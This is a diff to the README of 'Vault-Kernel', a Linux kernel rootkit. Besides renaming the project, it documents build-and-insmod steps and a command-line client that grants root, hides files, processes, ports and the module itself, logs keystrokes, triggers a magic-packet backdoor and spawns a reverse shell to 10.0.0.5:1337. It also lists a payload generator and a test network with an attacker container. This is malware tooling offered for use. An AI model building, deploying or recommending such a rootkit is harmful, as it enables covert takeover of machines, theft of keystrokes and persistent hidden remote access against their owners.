@@ -62,7 +62,7 @@ flowchart LR
         SH["self_hide<br/>lsmod del"]
     end
 
-    subgraph Device["💾 /dev/Vault-Kernel"]
+    subgraph Device["💾 /dev/vault_kernel"]
         IOC["ioctl interface"]
     end
 
@@ -117,41 +117,41 @@ sudo apt install build-essential linux-headers-$(uname -r) golang-go
 cd src && make
 
 # 2. Load into kernel
-sudo insmod Vault-Kernel.ko
+sudo insmod vault_kernel.ko
 
 # 3. Build Go client
-cd ../client/go && go build -o Vault-Kernel ./cmd/Vault-Kernel/
+cd ../client/go && go build -o vault_kernel ./cmd/vault_kernel/
 
 # 4. Verify it's loaded
-sudo ./Vault-Kernel status
+sudo ./vault_kernel status
 ```
 
 ### Usage
 
 ```bash
 # Escalate to root instantly
-sudo ./Vault-Kernel give-root
+sudo ./vault_kernel give-root
 
 # Hide a file from ls/find/stat
-sudo ./Vault-Kernel hide-file malicious.sh
+sudo ./vault_kernel hide-file malicious.sh
 
 # Hide a process from ps/top
-sudo ./Vault-Kernel hide-pid 1337
+sudo ./vault_kernel hide-pid 1337
 
 # Hide a network port from netstat/ss
-sudo ./Vault-Kernel hide-port 4444
+sudo ./vault_kernel hide-port 4444
 
 # Hide the rootkit from lsmod
-sudo ./Vault-Kernel hide-module
+sudo ./vault_kernel hide-module
 
 # Spawn reverse shell
-sudo ./Vault-Kernel shell 10.0.0.5:1337
+sudo ./vault_kernel shell 10.0.0.5:1337
 
 # Read captured keystrokes
-sudo ./Vault-Kernel keylog
+sudo ./vault_kernel keylog
 
 # List all hidden objects
-sudo ./Vault-Kernel list
+sudo ./vault_kernel list
 ```
 
 <br/>
@@ -162,27 +162,39 @@ sudo ./Vault-Kernel list
 
 ```
 Vault-Kernel/
-├── src/                    # Kernel module (C)
-│   ├── main.c              # init/exit, syscall table find, WP bypass
-│   ├── hooking.c           # install/remove hooks + RCU sync
-│   ├── file_hide.c         # getdents64/getdents/openat/unlinkat hooks
-│   ├── proc_hide.c         # PID hiding + kill hook (magic backdoor)
-│   ├── net_hide.c          # /proc/net/* filtering via read hook
-│   ├── keylogger.c         # keyboard notifier chain
-│   ├── backdoor.c          # reverse shell + magic packet trigger
-│   ├── priv_esc.c          # give-root via cred manipulation
-│   ├── stealth.c           # hide from lsmod + kobject_del
-│   ├── ioctl.c             # /dev/Vault-Kernel char device
-│   ├── core.h              # headers + ioctl constants
+├── src/                         # Kernel module (C)
+│   ├── main.c                   # init/exit, syscall table find, WP bypass
+│   ├── hooking.c                # install/remove hooks + RCU sync
+│   ├── file_hide.c              # getdents64/getdents/openat/unlinkat hooks
+│   ├── proc_hide.c              # PID hiding + kill hook (magic backdoor)
+│   ├── net_hide.c               # /proc/net/* filtering via read hook
+│   ├── keylogger.c              # keyboard notifier chain
+│   ├── backdoor.c               # reverse shell + magic packet trigger
+│   ├── priv_esc.c               # give-root via cred manipulation
+│   ├── stealth.c                # hide from lsmod + kobject_del
+│   ├── ioctl.c                  # /dev/vault_kernel char device
+│   ├── core.h                   # headers + ioctl constants
 │   └── Makefile
-├── client/go/              # Userland client (Go, zero deps)
-│   ├── cmd/Vault-Kernel/   # 14 commands
-│   └── internal/ioctl/     # ioctl wrapper + 15 unit tests
-├── payloads/               # Payload generator (Python)
-│   ├── payload.py          # Interactive generator (3 formats)
-│   └── builder.sh          # CLI wrapper
-└── tests/                  # Integration tests
-    └── integration.sh
+├── client/
+│   ├── vault_kernel_cli.py      # Python CLI (legacy, 14 commands)
+│   └── go/                      # Go CLI (primary, single binary)
+│       ├── go.mod
+│       ├── cmd/vault_kernel/    # Entry point (14 commands)
+│       └── internal/vaultkernel/# ioctl wrapper + 14 unit tests
+├── payloads/                    # Payload generator (Python)
+│   ├── payload.py               # Interactive generator (3 formats)
+│   └── builder.sh               # CLI wrapper
+├── docker/                      # Docker build + test environment
+│   ├── Dockerfile.build
+│   ├── docker-compose.yml
+│   ├── docker-compose.test.yml
+│   ├── build.sh
+│   └── test.sh
+├── tests/                       # Integration tests
+│   └── integration.sh
+└── brain/                       # Architecture decision records
+    ├── ADR.md
+    └── session_*.md
 ```
 
 <br/>
@@ -201,7 +213,7 @@ sudo bash tests/integration.sh
 # Docker build + test network
 bash docker/build.sh              # Compile .ko in container
 bash docker/test.sh up            # Start 3-node test network
-docker exec -it rooteame-attacker bash
+docker exec -it vault_kernel-attacker bash
 bash docker/test.sh down          # Cleanup
 ```
 
@@ -227,21 +239,21 @@ bash docker/test.sh down          # Cleanup
 ## 📚 All CLI Commands
 
 ```bash
-Vault-Kernel status              # Check if module is loaded
-Vault-Kernel give-root [pid]     # Grant root to a process
-Vault-Kernel hide-file <name>    # Hide file/directory
-Vault-Kernel unhide-file <name>  # Unhide file/directory
-Vault-Kernel hide-pid <pid>      # Hide process
-Vault-Kernel unhide-pid <pid>    # Unhide process
-Vault-Kernel hide-port <port>    # Hide network port
-Vault-Kernel unhide-port <port>  # Unhide network port
-Vault-Kernel list                # List all hidden objects
-Vault-Kernel shell <ip:port>     # Initiate reverse shell
-Vault-Kernel magic <word>        # Activate backdoor without open port
-Vault-Kernel keylog              # Read captured keystrokes
-Vault-Kernel keylog-clear        # Clear keylogger buffer
-Vault-Kernel hide-module         # Hide rootkit from lsmod
-Vault-Kernel unhide-module       # Make module visible again
+vault_kernel status              # Check if module is loaded
+vault_kernel give-root [pid]     # Grant root to a process
+vault_kernel hide-file <name>    # Hide file/directory
+vault_kernel unhide-file <name>  # Unhide file/directory
+vault_kernel hide-pid <pid>      # Hide process
+vault_kernel unhide-pid <pid>    # Unhide process
+vault_kernel hide-port <port>    # Hide network port
+vault_kernel unhide-port <port>  # Unhide network port
+vault_kernel list                # List all hidden objects
+vault_kernel shell <ip:port>     # Initiate reverse shell
+vault_kernel magic <word>        # Activate backdoor without open port
+vault_kernel keylog              # Read captured keystrokes
+vault_kernel keylog-clear        # Clear keylogger buffer
+vault_kernel hide-module         # Hide rootkit from lsmod
+vault_kernel unhide-module       # Make module visible again
 ```
 
 <br/>
